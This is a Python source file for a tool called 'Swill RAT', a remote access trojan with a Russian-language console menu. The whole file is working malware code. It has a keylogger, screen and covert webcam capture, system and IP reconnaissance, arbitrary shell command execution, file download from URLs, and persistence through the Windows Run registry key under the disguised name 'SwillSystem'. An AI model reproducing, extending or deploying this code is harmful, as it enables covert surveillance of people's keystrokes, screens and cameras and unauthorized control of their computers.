# swill_rat_local.py
import os
import subprocess
import platform
import socket
import shutil
import winreg
import sys
import time
import threading
from pynput.keyboard import Listener
from PIL import ImageGrab
import cv2
import requests

# === НАСТРОЙКИ ===
ADMIN_PASSWORD = "12345"  # Пароль для входа в меню (защита от случайных)

# === ПЕРЕМЕННЫЕ ===
keylog_data = ""
keylog_running = False

# === ФУНКЦИИ ===
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_system_info():
    info = f"""
    ═══════════════════════════════════════
       СИСТЕМНАЯ ИНФОРМАЦИЯ
    ═══════════════════════════════════════
    Хост:     {socket.gethostname()}
    ОС:       {platform.platform()}
    Пользователь: {os.getlogin()}
    IP:       {requests.get('https://api.ipify.org').text if requests else 'N/A'}
    Текущая папка: {os.getcwd()}
    Права:    {'Администратор' if os.getuid() == 0 else 'Пользователь'} 
    ═══════════════════════════════════════
    """
    return info

def take_screenshot():
    img = ImageGrab.grab()
    path = f"screenshot_{int(time.time())}.png"
    img.save(path)
    print(f"[+] Скриншот сохранён: {path}")
    return path

def webcam_shot():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = f"webcam_{int(time.time())}.jpg"
            cv2.imwrite(path, frame)
            print(f"[+] Фото с веб-камеры: {path}")
            return path
        else:
            print("[-] Веб-камера не найдена")
            return None
    except Exception as e:
        print(f"[-] Ошибка веб-камеры: {e}")
        return None

def execute_command(cmd):
    try:
        print(f"[>] Выполнение: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[Готово без вывода]"
        print(output)
        return output
    except Exception as e:
        print(f"[-] Ошибка: {e}")
        return str(e)

def start_keylogger():
    global keylog_running
    if keylog_running:
        print("[-] Кейлоггер уже запущен")
        return
    keylog_running = True
    print("[+] Кейлоггер запущен (пишет в keylog.txt)")
    def on_press(key):
        global keylog_data
        if keylog_running:
            try:
                keylog_data += key.char
            except:
                keylog_data += f" [{key}] "
            if len(keylog_data) > 100:
                with open("keylog.txt", "a", encoding="utf-8") as f:
                    f.write(keylog_data + "\n")
                keylog_data = ""
    with Listener(on_press=on_press) as listener:
        listener.join()

def stop_keylogger():
    global keylog_running
    keylog_running = False
    print("[-] Кейлоггер остановлен")

def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "SwillSystem", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(handle)
        print("[+] Добавлено в автозагрузку")
        return True
    except Exception as e:
        print(f"[-] Ошибка автозагрузки: {e}")
        return False

def remove_from_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(handle, "SwillSystem")
        winreg.CloseKey(handle)
        print("[-] Удалено из автозагрузки")
    except:
        print("[-] Не найдено в автозагрузке")

def file_upload(path):
    if os.path.exists(path):
        print(f"[+] Файл найден: {path}")
        return path
    else:
        print(f"[-] Файл не найден: {path}")
        return None

def file_download(url, save_path):
    try:
        r = requests.get(url, stream=True)
        with open(save_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"[+] Скачано: {save_path}")
        return save_path
    except Exception as e:
        print(f"[-] Ошибка скачивания: {e}")
        return None

def lock_screen():
    os.system("rundll32.exe user32.dll,LockWorkStation")
    print("[+] Экран заблокирован")

def shutdown_pc():
    os.system("shutdown /s /f /t 0")
    print("[+] Выключение...")

def restart_pc():
    os.system("shutdown /r /f /t 0")
    print("[+] Перезагрузка...")

# === ГЛАВНОЕ МЕНЮ ===
def show_menu():
    clear_screen()
    print("""
    ╔═══════════════════════════════════════╗
    ║     SWILL RAT — ЛОКАЛЬНОЕ УПРАВЛЕНИЕ  ║
    ╚═══════════════════════════════════════╝
    1. Информация о системе
    2. Скриншот
    3. Веб-камера
    4. Кейлоггер (вкл/выкл)
    5. Выполнить команду
    6. Загрузить файл с ПК
    7. Скачать файл из интернета
    8. Автозагрузка (вкл/выкл)
    9. Блокировка экрана
    10. Выключение ПК
    11. Перезагрузка
    0. Выход
    ════════════════════════════════════════
    """)

def main():
    global keylog_running
    password_attempts = 0
    while True:
        # Запрос пароля при входе
        if password_attempts == 0:
            pwd = input("Введите пароль доступа: ")
            if pwd != ADMIN_PASSWORD:
                print("Неверный пароль. Доступ запрещён.")
                password_attempts += 1
                if password_attempts >= 3:
                    print("Превышено количество попыток. Завершение.")
                    return
                continue
            else:
                password_attempts = 0
                print("Доступ разрешён.")
                time.sleep(1)
        
        show_menu()
        choice = input("Выберите действие: ")
        
        if choice == "1":
            print(get_system_info())
            input("Нажмите Enter для продолжения...")
        
        elif choice == "2":
            take_screenshot()
            input("Нажмите Enter для продолжения...")
        
        elif choice == "3":
            webcam_shot()
            input("Нажмите Enter для продолжения...")
        
        elif choice == "4":
            if keylog_running:
                stop_keylogger()
            else:
                threading.Thread(target=start_keylogger, daemon=True).start()
            input("Нажмите Enter для продолжения...")
        
        elif choice == "5":
            cmd = input("Введите команду: ")
            execute_command(cmd)
            input("Нажмите Enter для продолжения...")
        
        elif choice == "6":
            path = input("Введите полный путь к файлу: ")
            file_upload(path)
            input("Нажмите Enter для продолжения...")
        
        elif choice == "7":
            url = input("Введите URL файла: ")
            save_path = input("Куда сохранить (полный путь): ")
            file_download(url, save_path)
            input("Нажмите Enter для продолжения...")
        
        elif choice == "8":
            sub_choice = input("1 - Добавить в автозагрузку\n2 - Удалить из автозагрузки\nВыбор: ")
            if sub_choice == "1":
                add_to_startup()
            elif sub_choice == "2":
                remove_from_startup()
            input("Нажмите Enter для продолжения...")
        
        elif choice == "9":
            lock_screen()
            input("Нажмите Enter для продолжения...")
        
        elif choice == "10":
            confirm = input("Вы уверены? (y/n): ")
            if confirm.lower() == "y":
                shutdown_pc()
        
        elif choice == "11":
            confirm = input("Вы уверены? (y/n): ")
            if confirm.lower() == "y":
                restart_pc()
        
        elif choice == "0":
            if keylog_running:
                stop_keylogger()
            print("Выход из SWILL RAT.")
            break
        
        else:
            print("Неверный выбор.")
            input("Нажмите Enter для продолжения...")

if __name__ == "__main__":
    main()